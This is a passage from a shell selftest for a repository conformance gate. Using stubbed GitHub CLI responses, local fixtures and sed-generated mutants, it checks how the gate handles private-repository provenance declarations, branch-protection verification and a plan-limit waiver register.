  OUT=$( ( INCEPTION_DONE_GH_CMD="$_priv_stub" INCEPTION_DONE_GH_VAR_CMD="sh $d/varstub.sh" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "FAIL: gate-provenance repo-class"
  st_has "cannot pass Inception silently provenance-less"
  st_has "KIT_ATTEST_PRIVATE"
  st_has "record a dated na disposition"
  st_hasnt "move it to a git""hub org"
  if [ "$RC" -ne 0 ]; then
    echo "    ok  : rc $RC (non-zero, as a strict FAIL leg must produce)"
  else
    echo "    BAD : rc 0 — a strict FAIL leg must not report gate satisfied"; st_fail=1
  fi
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_priv_stub" INCEPTION_DONE_GH_VAR_CMD="sh $d/varstub.sh" MODE=surface run_gate "$d" ) 2>&1 ); RC=$?
  st_has "OUTSTANDING: gate-provenance repo-class"
  st_has "KIT_ATTEST_PRIVATE"
  st_hasnt "FAIL: gate-provenance repo-class"

  # (r) SAME fixture + a validated na disposition for gate-provenance -> N/A (an adopter who has
  # consciously dispositioned provenance is not blocked twice). The na file is written EXPLICITLY
  # by _id_mkdisp_na — the original draft reused the tmpl's inherited gate-dispositions.txt, which
  # is export-ignore'd and therefore ABSENT in every incepted-export verify context (the ambient-
  # content hermeticity face; see _id_mkdisp_na's header for the measurement).
  # NOTE: no whole-gate st_rc assertion here (same rationale as every other claude-code fixture in
  # this file, stated at the oracle-marker comment above: the cloned fixture tree's OWN unrelated
  # harness-adapter leg does not always come up clean, so only THIS leg's specific lines are asserted.
  echo "--- (r) gate-provenance repo-class: validated na disposition -> N/A, not blocked twice ---"
  d=$(st_mkfix r claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  printf 'FROM scratch\n' > "$d/Dockerfile"
  _id_mkdisp_na "$d"; _id_varstub "$d" "$_vs_404" "$_vs_org_none"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_priv_stub" INCEPTION_DONE_GH_VAR_CMD="sh $d/varstub.sh" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "N/A: gate-provenance repo-class"
  st_hasnt "FAIL: gate-provenance repo-class"
  # (r2) the same na on an ORG-OWNED private repository: the na route covers every private repository without the declaration.
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_privorg_stub" INCEPTION_DONE_GH_VAR_CMD="sh $d/varstub.sh" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "N/A: gate-provenance repo-class"
  st_hasnt "FAIL: gate-provenance repo-class"

  # (s) NOT deployable (no Dockerfile, no deploy workflow) -> N/A regardless of repo-class (proves
  # the AND: deployable must be TRUE, not just private+user-owned, for this leg to fire).
  echo "--- (s) gate-provenance repo-class: not deployable -> N/A regardless of privacy ---"
  d=$(st_mkfix s claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  # TBG-TRUSTED-JOB fix round: the cloned fixture template inherits the KIT's OWN tree, which now
  # carries .github/workflows/tracker-live.yml AND adopter-tracker-gates.yml (its installed copy) —
  # kit-only, export-ignored workflows whose `environment: tracker-live` jobs make wf_is_deploy() true. A "NOT
  # deployable" fixture must genuinely have no deploy surface; strip it here (the ONE leg in this
  # file that asserts non-deployability — every other gate-provenance leg adds its own Dockerfile
  # and is deployable on purpose). drift-watch.yml/golden-path.yml are ALSO kit-only/export-ignored
  # but wf_is_deploy() does not read either as a deploy trigger (unaffected; this leg passed on
  # `main` before tracker-live.yml existed).
  rm -f "$d/.github/workflows/tracker-live.yml" "$d/.github/workflows/adopter-tracker-gates.yml"
  _id_mkdisp_apply "$d"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_priv_stub" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "N/A: gate-provenance repo-class"
  st_has "no deploy surface"
  st_hasnt "FAIL: gate-provenance repo-class"

  # (t) deployable + PUBLIC repo -> PASS (proves the AND's other operand: private must be TRUE too).
  echo "--- (t) gate-provenance repo-class: deployable + public repo -> PASS ---"
  d=$(st_mkfix t claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  printf 'FROM scratch\n' > "$d/Dockerfile"
  _id_mkdisp_apply "$d"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_pub_stub" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "PASS: gate-provenance repo-class"
  st_hasnt "FAIL: gate-provenance repo-class"

  # (u) [reviewer Minor-5b + security LOW-2, fix round 1] the UNVERIFIABLE branch (gh/jq
  # missing/unauthenticated) -> strict FAIL / surface OUTSTANDING, never the affirmative PASS.
  # Seam-stubbed via an empty-output INCEPTION_DONE_GH_CMD (no network, no real gh needed).
  _empty_stub='true'
  echo "--- (u) gate-provenance repo-class: gh/jq unverifiable -> FAIL/OUTSTANDING, never PASS ---"
  d=$(st_mkfix u claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  printf 'FROM scratch\n' > "$d/Dockerfile"
  _id_mkdisp_apply "$d"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_empty_stub" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "FAIL: gate-provenance repo-class"
  st_has "unverifiable"
  st_hasnt "PASS: gate-provenance repo-class"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_empty_stub" MODE=surface run_gate "$d" ) 2>&1 ); RC=$?
  st_has "OUTSTANDING: gate-provenance repo-class"
  st_hasnt "FAIL: gate-provenance repo-class"
  st_hasnt "PASS: gate-provenance repo-class"

  # (v) [security MED-1, fix round 1] a PARSE FAILURE — the gh response is well-formed JSON but
  # neither field is exactly `true`/`false` (a garbage/malformed value) — must be unverifiable
  # (strict FAIL / surface OUTSTANDING), NEVER the affirmative public/org PASS. The measured defect
  # this fixture kills: before the fix, an unparseable isPrivate fell through the `true && false`
  # test to the `else` arm and printed a bare PASS.
  _garbage_stub='printf {"isPrivate":"maybe","isInOrganization":false}'
  echo "--- (v) gate-provenance repo-class: garbage/malformed gh JSON -> FAIL/OUTSTANDING, never PASS ---"
  d=$(st_mkfix v claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  printf 'FROM scratch\n' > "$d/Dockerfile"
  _id_mkdisp_apply "$d"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_garbage_stub" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "FAIL: gate-provenance repo-class"
  st_has "malformed"
  st_hasnt "PASS: gate-provenance repo-class"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_garbage_stub" MODE=surface run_gate "$d" ) 2>&1 ); RC=$?
  st_has "OUTSTANDING: gate-provenance repo-class"
  st_hasnt "FAIL: gate-provenance repo-class"
  st_hasnt "PASS: gate-provenance repo-class"

  # (x) SWAS-813 — the KIT_ATTEST_PRIVATE declaration on a PRIVATE deployable repository. Each cell builds a deployable fixture
  # with an all-apply disposition file and the variable-read stub, and asserts the leg's own lines. _id_xcell runs the gate in
  # one mode; _id_xmut runs a MUTATED copy of this script as the real entry and asserts it no longer prints what the intact
  # cell requires. The mutated lines carry the markers MUT-ORG, MUT-ORGREAD and MUT-PREC in _id_attest_state and the leg.
  _id_xcell() { # <label> <repo-view-stub> <repo-answer> <org-answer> [strict|surface]
    _xd=$(st_mkfix "x$1" claude-code); st_install_hook "$_xd"; st_gh "$_xd"; st_bpstub "$_xd" 0
    printf 'FROM scratch\n' > "$_xd/Dockerfile"; _id_mkdisp_apply "$_xd"; _id_varstub "$_xd" "$3" "$4"
    OUT=$( ( INCEPTION_DONE_GH_CMD="$2" INCEPTION_DONE_GH_VAR_CMD="sh $_xd/varstub.sh" MODE="${5:-strict}" run_gate "$_xd" ) 2>&1 ); RC=$?
  }
  _id_xmut() { # <label> <sed-script> <repo-view-stub> <repo-answer> <org-answer> <line the intact cell prints> <line the mutant must print instead>
    _xd=$(st_mkfix "m$1" claude-code); st_install_hook "$_xd"; st_gh "$_xd"; st_bpstub "$_xd" 0
    printf 'FROM scratch\n' > "$_xd/Dockerfile"; _id_mkdisp_apply "$_xd"; _id_varstub "$_xd" "$4" "$5"
    sed "$2" "$0" > "$_xd/conformance/inception-done-probe.sh"
    if cmp -s "$0" "$_xd/conformance/inception-done-probe.sh"; then
      echo "    BAD : the $1 mutant did not apply (the sed expression matched nothing)"; st_fail=1; return 0
    fi
    # the copy that runs also has the seam live (a real entry keeps _ID_SEAMS at 0), so only the marked line differs from the intact gate
    sed -e "$2" -e 's/^_ID_SEAMS=0$/_ID_SEAMS=1/' "$0" > "$_xd/conformance/inception-done-mut.sh"
    if ! sh -n "$_xd/conformance/inception-done-mut.sh" 2>/dev/null; then
      echo "    BAD : the $1 mutant does not parse (a mutant that cannot run would read as killed)"; st_fail=1; return 0
    fi
    OUT=$( INCEPTION_DONE_GH_CMD="$3" INCEPTION_DONE_GH_VAR_CMD="sh $_xd/varstub.sh" sh "$_xd/conformance/inception-done-mut.sh" "$_xd" 2>&1 ); RC=$?
    case "$OUT" in
      *"$6"*) printf '    BAD : the %s mutant survived (the cell still prints [%s])\n' "$1" "$6"; st_fail=1 ;;
      *"$7"*) printf '    ok  : the %s mutant no longer prints [%s] and prints [%s]\n' "$1" "$6" "$7" ;;
      *) printf '    BAD : the %s mutant dropped [%s] but did not print the flipped verdict [%s] (it died some other way)\n' "$1" "$6" "$7"; st_fail=1 ;;
    esac
  }
  echo "--- (x1) private, repository variable true -> PASS ---"
  _id_xcell 1 "$_priv_stub" "$_vs_repo_true" "$_vs_org_none"
  st_has "PASS: gate-provenance repo-class"; st_hasnt "FAIL: gate-provenance repo-class"
  echo "--- (x2) private, repository variable absent (404), organization variable true -> PASS ---"
  _id_xcell 2 "$_priv_stub" "$_vs_404" "$_vs_org_true"
  st_has "PASS: gate-provenance repo-class"; st_hasnt "FAIL: gate-provenance repo-class"
  echo "--- (x3) private, both reads absent -> strict FAIL / surface OUTSTANDING, the cure names the variable and the na route ---"
  _id_xcell 3 "$_priv_stub" "$_vs_404" "$_vs_org_none"
  st_has "FAIL: gate-provenance repo-class"; st_has "KIT_ATTEST_PRIVATE"; st_has "record a dated na disposition"; st_rc 1
  _id_xcell 3s "$_priv_stub" "$_vs_404" "$_vs_org_none" surface
  st_has "OUTSTANDING: gate-provenance repo-class"; st_has "KIT_ATTEST_PRIVATE"; st_hasnt "FAIL: gate-provenance repo-class"
  echo "--- (x4) private ORG-owned, both reads absent -> FAIL (the owner type no longer passes the gate) ---"
  _id_xcell 4 "$_privorg_stub" "$_vs_404" "$_vs_org_none"
  st_has "FAIL: gate-provenance repo-class"; st_hasnt "PASS: gate-provenance repo-class"; st_rc 1
  echo "--- (x5) private, repository read 403 -> UNVERIFIABLE (strict FAIL / surface OUTSTANDING), never PASS ---"
  _id_xcell 5 "$_priv_stub" "$_vs_403" "$_vs_org_true"
  st_has "FAIL: gate-provenance repo-class"; st_has "unverifiable"; st_hasnt "PASS: gate-provenance repo-class"
  _id_xcell 5s "$_priv_stub" "$_vs_403" "$_vs_org_true" surface
  st_has "OUTSTANDING: gate-provenance repo-class"; st_has "unverifiable"; st_hasnt "PASS: gate-provenance repo-class"
  echo "--- (x6) private, repository read 404 and organization read 403 -> UNVERIFIABLE ---"
  _id_xcell 6 "$_priv_stub" "$_vs_404" "$_vs_403"
  st_has "FAIL: gate-provenance repo-class"; st_has "unverifiable"; st_hasnt "PASS: gate-provenance repo-class"
  echo "--- (x7) an exported KIT_ATTEST_PRIVATE is never read, in or out of Actions -> the API reads decide (absent -> FAIL) ---"
  _id_xcell 7 "$_priv_stub" "$_vs_404" "$_vs_org_none"
  OUT=$( ( KIT_ATTEST_PRIVATE=true INCEPTION_DONE_GH_CMD="$_priv_stub" INCEPTION_DONE_GH_VAR_CMD="sh $_xd/varstub.sh" MODE=strict run_gate "$_xd" ) 2>&1 ); RC=$?
  st_has "FAIL: gate-provenance repo-class"; st_hasnt "PASS: gate-provenance repo-class"
  OUT=$( ( GITHUB_ACTIONS=true KIT_ATTEST_PRIVATE=true INCEPTION_DONE_GH_CMD="$_priv_stub" INCEPTION_DONE_GH_VAR_CMD="sh $_xd/varstub.sh" MODE=strict run_gate "$_xd" ) 2>&1 ); RC=$?
  st_has "FAIL: gate-provenance repo-class"; st_hasnt "PASS: gate-provenance repo-class"
  echo "--- (x8) private, repository variable false and organization variable true -> absent (the repository value decides, the organization is not read) ---"
  _id_xcell 8 "$_priv_stub" "$_vs_repo_false" "$_vs_org_true"
  st_has "FAIL: gate-provenance repo-class"; st_hasnt "PASS: gate-provenance repo-class"
  case "$(cat "$_xd/varstub.sh.calls" 2>/dev/null)" in
    *organization-variables*) echo "    BAD : the organization list was read although the repository variable decided"; st_fail=1 ;;
    *actions/variables/KIT_ATTEST_PRIVATE*) echo "    ok  : only the repository variable was read" ;;
    *) echo "    BAD : the variable-read seam was never called"; st_fail=1 ;;
  esac
  echo "--- (x9) private, repository variable TRUE (any case) -> PASS ---"
  _id_xcell 9 "$_priv_stub" "$_vs_repo_TRUE" "$_vs_org_none"
  st_has "PASS: gate-provenance repo-class"; st_hasnt "FAIL: gate-provenance repo-class"
  echo "--- (x10) private, organization list holds only a different name -> absent (the exact name is matched) ---"
  _id_xcell 10 "$_priv_stub" "$_vs_404" "$_vs_org_decoy"
  st_has "FAIL: gate-provenance repo-class"; st_hasnt "PASS: gate-provenance repo-class"
  echo "--- (x11) non-GitHub remote: the leg's output is unchanged (visibility unverifiable, no declaration text) ---"
  d=$(st_mkfix x11 claude-code); st_install_hook "$d"; st_nongh "$d"; st_attest "$d"
  printf 'FROM scratch\n' > "$d/Dockerfile"; _id_mkdisp_apply "$d"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_empty_stub" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "FAIL: gate-provenance repo-class — GitHub repo visibility unverifiable and verification is required (strict)"; st_hasnt "KIT_ATTEST_PRIVATE"
  echo "--- (x12) NOT deployable, private ORG-owned -> N/A (the precondition still gates the leg) ---"
  d=$(st_mkfix x12 claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  rm -f "$d/.github/workflows/tracker-live.yml" "$d/.github/workflows/adopter-tracker-gates.yml"
  _id_mkdisp_apply "$d"; _id_varstub "$d" "$_vs_404" "$_vs_org_none"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_privorg_stub" INCEPTION_DONE_GH_VAR_CMD="sh $d/varstub.sh" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "N/A: gate-provenance repo-class"; st_has "no deploy surface"; st_hasnt "FAIL: gate-provenance repo-class"
  echo "--- (x13) mutant: 'or org-owned' restored -> the private-org cell (x4) must red ---"
  _id_xmut org '/# MUT-ORG$/s#.*#  elif [ "$_id_priv" = "true" ] \&\& [ "$(printf "%s" "$_id_gh_json" | jq -r ".isInOrganization")" != "true" ]; then#' "$_privorg_stub" "$_vs_404" "$_vs_org_none" "FAIL: gate-provenance repo-class" "PASS: gate-provenance repo-class"
  echo "--- (x14) mutant: the organization-variable read skipped -> the org-only cell (x2) must red ---"
  _id_xmut orgread "/# MUT-ORGREAD\$/s/.*/    _id_ro=\"\"; _id_rc=0/" "$_priv_stub" "$_vs_404" "$_vs_org_true" "PASS: gate-provenance repo-class" "FAIL: gate-provenance repo-class"
  echo "--- (x15) mutant: the organization decides over the repository -> the repository-false cell (x8) must red ---"
  _id_xmut prec '/# MUT-PREC$/s/_id_found=yes/_id_found=no/' "$_priv_stub" "$_vs_repo_false" "$_vs_org_true" "FAIL: gate-provenance repo-class" "PASS: gate-provenance repo-class"
  echo "--- (x16) the variable-read seam exported outside the selftest is ignored (a real entry reads gh, which here fails with a 403) ---"
  _id_xcell 16 "$_priv_stub" "$_vs_repo_true" "$_vs_org_true"
  mkdir -p "$_xd/nogh"; printf '%s\n' '#!/bin/sh' 'echo "gh: Resource not accessible (HTTP 403)" >&2' 'exit 1' > "$_xd/nogh/gh"; chmod +x "$_xd/nogh/gh"
  OUT=$( PATH="$_xd/nogh:$PATH" INCEPTION_DONE_GH_CMD="$_priv_stub" INCEPTION_DONE_GH_VAR_CMD="sh $_xd/varstub.sh" sh "$0" "$_xd" 2>&1 ); RC=$?
  st_has "gate-provenance repo-class"; st_has "unverifiable"; st_has "KIT_ATTEST_PRIVATE declaration is unverifiable"; st_hasnt "PASS: gate-provenance repo-class"
  echo "--- (x17) private, a validated na and a 403 on the repository read -> N/A (a recorded na decides, whatever the read said) ---"
  d=$(st_mkfix x17 claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  printf 'FROM scratch\n' > "$d/Dockerfile"; _id_mkdisp_na "$d"; _id_varstub "$d" "$_vs_403" "$_vs_403"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_priv_stub" INCEPTION_DONE_GH_VAR_CMD="sh $d/varstub.sh" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "N/A: gate-provenance repo-class"; st_hasnt "FAIL: gate-provenance repo-class"

  # (w) REAL ENTRY (SWAS-212). Every cell above calls run_gate in this `set +e` shell, so none can see a
  # silent abort; these run `sh "$0" <dir>` itself, with set -e live, and assert the SUMMARY line the
  # gate prints last — an abort before it reds. Branch-protection is stubbed protected (rc 0) and
  # unverifiable (rc 2); the provenance leg is made deterministic by the public-repo stub.
  _plan_cause='this plan cannot enforce protection on a private repository (a public repository or a paid plan can)'
  echo "--- (w1) real entry: protected (bp exit 0) -> verdict and summary reached, both modes ---"
  d=$(st_mkfix w1 claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  printf 'FROM scratch\n' > "$d/Dockerfile"; _id_mkdisp_apply "$d"
  st_real "$d" strict;  st_has "PASS: verified protected"; st_has "Inception-Done gate"
  st_real "$d" surface; st_has "PASS: verified protected"; st_has "Inception-Done gate"
  echo "--- (w2) real entry: unverifiable (bp exit 2) -> the unverifiable line and the summary, both modes ---"
  d=$(st_mkfix w2 claude-code); st_install_hook "$d"; st_gh "$d"
  st_bpstub "$d" 2 'UNVERIFIED: protection endpoint returned non-200 (token may lack repo-admin, or transient/empty) on me/repo — run in CI or authenticate gh. (NOT a pass.)'
  printf 'FROM scratch\n' > "$d/Dockerfile"; _id_mkdisp_apply "$d"
  st_real "$d" strict;  st_has "FAIL: branch protection — GitHub state unverifiable"; st_has "FAIL: Inception-Done gate not satisfied"; st_hasnt "$_plan_cause"
  st_real "$d" surface; st_has "OUTSTANDING: branch protection — GitHub state unverifiable"; st_has "Inception-Done gate"; st_hasnt "$_plan_cause"
  echo "--- (w3) real entry: unverifiable because the plan cannot protect a private repo -> the cause is named, fixed text ---"
  d=$(st_mkfix w3 claude-code); st_install_hook "$d"; st_gh "$d"
  st_bpstub "$d" 2 "UNVERIFIED: protection endpoint returned non-200 on me/repo: $_plan_cause — run in CI or authenticate gh. (NOT a pass.)"
  printf 'FROM scratch\n' > "$d/Dockerfile"; _id_mkdisp_apply "$d"
  st_real "$d" strict;  st_has "  cause: $_plan_cause"; st_has "FAIL: Inception-Done gate not satisfied"; st_hasnt "me/repo"
  st_real "$d" surface; st_has "  cause: $_plan_cause"; st_has "OUTSTANDING: branch protection — GitHub state unverifiable"; st_hasnt "me/repo"
  # (w4) MUTANT: the guard dropped. The mutated gate is installed as the fixture's own copy and run as the
  # real entry; it must NOT reach the protected verdict (it aborts at the count), proving (w1) can red.
  echo "--- (w4) mutant: no \`|| true\` on the FAIL count -> the real-entry cell must red ---"
  d=$(st_mkfix w4 claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  printf 'FROM scratch\n' > "$d/Dockerfile"; _id_mkdisp_apply "$d"
  sed '/# MUT-BPCOUNT$/s/ || true)/)/' "$0" > "$d/conformance/inception-done-mut.sh"
  if cmp -s "$0" "$d/conformance/inception-done-mut.sh"; then
    echo "    BAD : the MUT-BPCOUNT mutant did not apply"; st_fail=1
  else
    OUT=$( INCEPTION_DONE_GH_CMD="$_pub_stub" sh "$d/conformance/inception-done-mut.sh" "$d" 2>&1 ); RC=$?
    case "$OUT" in
      *"PASS: verified protected"*) printf '    BAD : the MUT-BPCOUNT mutant survived (the real-entry cell did not red)\n'; st_fail=1 ;;
      *) if [ "$RC" = 1 ]; then printf '    ok  : the mutant aborts before the verdict (rc 1), so (w1) reds on it\n'; else printf '    BAD : the MUT-BPCOUNT mutant died with rc %s, not the abort status 1 (a crash, not the guard)\n' "$RC"; st_fail=1; fi ;;
    esac
  fi

  # (bpw) SWAS-814 — the plan-limit waiver. A ratified, unexpired branch-protection-plan row in the tree's own
  # WAIVER-REGISTER.md turns the plan-limit cause (and only it) into a WAIVED line that still says NOT ENFORCED. Each cell
  # runs the in-process gate with the branch-protection seam stubbed (st_bpstub / a split stub) and a register this cell writes
  # explicitly: the fixture is a clone of the kit tree, whose own root register must never answer for the cell. The public-repo
  # stub keeps the provenance leg deterministic. "No fail" is read against a baseline fixture whose branch protection is
  # verified (bp exit 0): the waived run must return what the protected run returns, so the waiver adds no failure of its own.
  _bpd() { date -u -d "$1 days" +%Y-%m-%d 2>/dev/null || date -u -v"$1"d +%Y-%m-%d; }
  _bpD0=$(_bpd +0); _bpD60=$(_bpd +60); _bpDP10=$(_bpd -10); _bpDP100=$(_bpd -100)
  _bpw_reg() { # <dir> <gate> <owner> <opened> <expires> [ratified-by]
    printf '## Active waivers\n\n| Gate | Reason | Owner | Opened | Expires | Remediation plan | Ratified-by |\n|--|--|--|--|--|--|--|\n| %s | free private repository | %s | %s | %s | public repository or paid plan | %s |\n' "$2" "$3" "$4" "$5" "${6:-@sec}" > "$1/WAIVER-REGISTER.md"
  }
  _bpw_fix() { # <name> -> a fixture whose branch protection reports the plan-limit cause (bp exit 2), no register yet
    _bpd_=$(st_mkfix "$1" claude-code); st_install_hook "$_bpd_"; st_gh "$_bpd_"
    st_bpstub "$_bpd_" 2 "UNVERIFIED: protection endpoint returned non-200 on me/repo: $_plan_cause — run in CI or authenticate gh. (NOT a pass.)"
    rm -f "$_bpd_/WAIVER-REGISTER.md"
    printf '%s' "$_bpd_"
  }
  _bpw_run() { OUT=$( ( INCEPTION_DONE_GH_CMD="$_pub_stub" MODE="${2:-strict}" run_gate "$1" ) 2>&1 ); RC=$?; }
  _bpw_line="WAIVED: branch protection — NOT ENFORCED: this plan cannot enforce protection on a private repository; waived by"
  echo "--- (bpw0) baseline: verified protection (bp exit 0) -> the return the waived runs must equal ---"
  d=$(st_mkfix bpw0 claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0; rm -f "$d/WAIVER-REGISTER.md"
  _bpw_run "$d"; st_has "PASS: verified protected"; _bpw_base_rc=$RC
  echo "--- (bpw1) plan-limit cause + an active row -> WAIVED, NOT ENFORCED, no failure of its own, strict and surface ---"
  d=$(_bpw_fix bpw1); _bpw_reg "$d" branch-protection-plan @jdoe "$_bpD0" "$_bpD60"
  _bpw_run "$d" strict
  st_has "  cause: $_plan_cause"; st_has "$_bpw_line @jdoe until $_bpD60 (exit: make the repository public, or move to a paid plan)"
  st_hasnt "FAIL: branch protection"; st_hasnt "OUTSTANDING: branch protection"; st_hasnt "waiver route"
  # "No failure of its own" is only decidable against a green baseline: on a tree whose whole-gate verdict is not OK for other
  # reasons (an export tree, with no ADR-000 or BACKLOG.md) both returns are 1, and equal returns would prove nothing.
  if [ "$_bpw_base_rc" = 0 ]; then st_rc 0
  else echo "selftest n/a: (bpw1) skipped — the waived run's no-fail check needs a green baseline on this tree (baseline rc $_bpw_base_rc)"; fi
  _bpw_run "$d" surface
  st_has "$_bpw_line @jdoe until $_bpD60"; st_hasnt "OUTSTANDING: branch protection"; st_hasnt "FAIL: branch protection"
  echo "--- (bpw2) plan-limit cause, no row / expired row / placeholder row -> today's FAIL (OUTSTANDING under --surface) plus the waiver route ---"
  d=$(_bpw_fix bpw2)
  _bpw_run "$d" strict
  st_has "FAIL: branch protection — GitHub state unverifiable"; st_has "waiver route: a ratified, unexpired branch-protection-plan row"; st_hasnt "WAIVED"; st_rc 1
  _bpw_run "$d" surface
  st_has "OUTSTANDING: branch protection — GitHub state unverifiable"; st_has "waiver route:"; st_hasnt "WAIVED"
  _bpw_reg "$d" branch-protection-plan @jdoe "$_bpDP100" "$_bpDP10"
  _bpw_run "$d" strict
  st_has "FAIL: branch protection — GitHub state unverifiable"; st_has "waiver route:"; st_hasnt "WAIVED"; st_rc 1
  _bpw_reg "$d" branch-protection-plan "[owner]" "$_bpD0" "$_bpD60" "[security-owner]"
  _bpw_run "$d" strict
  st_has "FAIL: branch protection — GitHub state unverifiable"; st_has "waiver route:"; st_hasnt "WAIVED"; st_rc 1
  echo "--- (bpw3) plan-limit cause + only a board-governance row -> FAIL (a row for another gate waives nothing here) ---"
  d=$(_bpw_fix bpw3); _bpw_reg "$d" board-governance @jdoe "$_bpD0" "$_bpD60"
  _bpw_run "$d" strict
  st_has "FAIL: branch protection — GitHub state unverifiable"; st_has "waiver route:"; st_hasnt "WAIVED"; st_rc 1
  echo "--- (bpw4) plan-limit cause + a valid row inside a register the full run rejects (a smuggled secret-scan row) -> FAIL ---"
  d=$(_bpw_fix bpw4); _bpw_reg "$d" branch-protection-plan @jdoe "$_bpD0" "$_bpD60"
  printf '| secret-scan | smuggled | @jdoe | %s | %s | y | @sec |\n' "$_bpD0" "$_bpD60" >> "$d/WAIVER-REGISTER.md"
  _bpw_run "$d" strict
  st_has "FAIL: branch protection — GitHub state unverifiable"; st_hasnt "WAIVED"; st_rc 1
  echo "--- (bpw5) plan-limit cause + an active row + the vacuous-tracker FAIL -> FAIL (the row cannot waive it) ---"
  d=$(_bpw_fix bpw5); _bpw_reg "$d" branch-protection-plan @jdoe "$_bpD0" "$_bpD60"
  printf '%s\n' "FAIL: tracker-board-gates is declared required but this tree's backlog backend is md — the trusted job skips on md, so the context would be always-green; remove it from REQUIRED-CHECKS.md and from branch protection (see RUNBOOK, reverting a tracker)" > "$d/conformance/bp-stub-do.msg"
  printf '#!/bin/sh\ncase " $* " in\n  *" --declared-only "*) cat "$(dirname "$0")/bp-stub-do.msg"; exit 1 ;;\n  *) cat "$(dirname "$0")/bp-stub.msg"; exit 2 ;;\nesac\n' > "$d/conformance/branch-protection.sh"; chmod +x "$d/conformance/branch-protection.sh"
  _bpw_run "$d" strict
  st_has "FAIL: branch protection — tracker-board-gates is declared required"; st_has "$_bpw_line @jdoe until $_bpD60"; st_rc 1
  _bpw_run "$d" surface
  st_has "FAIL: branch protection — tracker-board-gates is declared required"
  echo "--- (bpw6) unauthenticated rc 2 (no plan-limit cause) + an active row -> FAIL, never WAIVED ---"
  d=$(st_mkfix bpw6 claude-code); st_install_hook "$d"; st_gh "$d"
  st_bpstub "$d" 2 'UNVERIFIED: protection endpoint returned non-200 (token may lack repo-admin, or transient/empty) on me/repo — run in CI or authenticate gh. (NOT a pass.)'
  _bpw_reg "$d" branch-protection-plan @jdoe "$_bpD0" "$_bpD60"
  _bpw_run "$d" strict
  st_has "FAIL: branch protection — GitHub state unverifiable"; st_hasnt "WAIVED"; st_hasnt "waiver route"; st_rc 1
  _bpw_run "$d" surface
  st_has "OUTSTANDING: branch protection — GitHub state unverifiable"; st_hasnt "WAIVED"
  echo "--- (bpw7) rc 1 (verified unprotected) + an active row -> FAIL, never WAIVED ---"
  d=$(st_mkfix bpw7 claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 1
  _bpw_reg "$d" branch-protection-plan @jdoe "$_bpD0" "$_bpD60"
  _bpw_run "$d" strict
  st_has "FAIL: branch protection"; st_has "NOT protected"; st_hasnt "WAIVED"; st_rc 1
  echo "--- (bpw8) an owner longer than 60 characters is bounded in the echo ---"
  d=$(_bpw_fix bpw8); _bpw_long=$(printf '%070d' 0 | tr 0 a)
  _bpw_reg "$d" branch-protection-plan "$_bpw_long" "$_bpD0" "$_bpD60"
  _bpw_run "$d" strict
  st_has "waived by $(printf '%060d' 0 | tr 0 a) until $_bpD60"; st_hasnt "$(printf '%061d' 0 | tr 0 a)"
  # MUTANTS: a copy of this gate with one marked line changed is run as the real entry, against its own fixture and the kit's
  # waivers-valid.sh, and must print the FLIPPED verdict, not merely a different return.
  _bpw_mut() { # <dir> <label> <sed-script> <line the intact cell prints> <line the mutant must print instead>
    cp "$(dirname "$CI_GATES_SH")/waivers-valid.sh" "$1/conformance/waivers-valid.sh"
    sed -e "$3" "$0" > "$1/conformance/inception-done-bpm.sh"
    if cmp -s "$0" "$1/conformance/inception-done-bpm.sh"; then
      echo "    BAD : the $2 mutant did not apply (the sed expression matched nothing)"; st_fail=1; return 0
    fi
    if ! sh -n "$1/conformance/inception-done-bpm.sh" 2>/dev/null; then
      echo "    BAD : the $2 mutant does not parse (a mutant that cannot run would read as killed)"; st_fail=1; return 0
    fi
    OUT=$( INCEPTION_DONE_GH_CMD="$_pub_stub" sh "$1/conformance/inception-done-bpm.sh" "$1" 2>&1 ); RC=$?
    case "$OUT" in
      *"$4"*) printf '    BAD : the %s mutant survived (the cell still prints [%s])\n' "$2" "$4"; st_fail=1 ;;
      *"$5"*) printf '    ok  : the %s mutant no longer prints [%s] and prints [%s]\n' "$2" "$4" "$5" ;;
      *) printf '    BAD : the %s mutant dropped [%s] but did not print the flipped verdict [%s] (it died some other way)\n' "$2" "$4" "$5"; st_fail=1 ;;
    esac
  }
  echo "--- (bpw9) mutant: the plan-limit condition dropped (waive any rc 2) -> the unauthenticated cell (bpw6) must red ---"
  d=$(st_mkfix bpw9 claude-code); st_install_hook "$d"; st_gh "$d"
  st_bpstub "$d" 2 'UNVERIFIED: protection endpoint returned non-200 (token may lack repo-admin, or transient/empty) on me/repo — run in CI or authenticate gh. (NOT a pass.)'
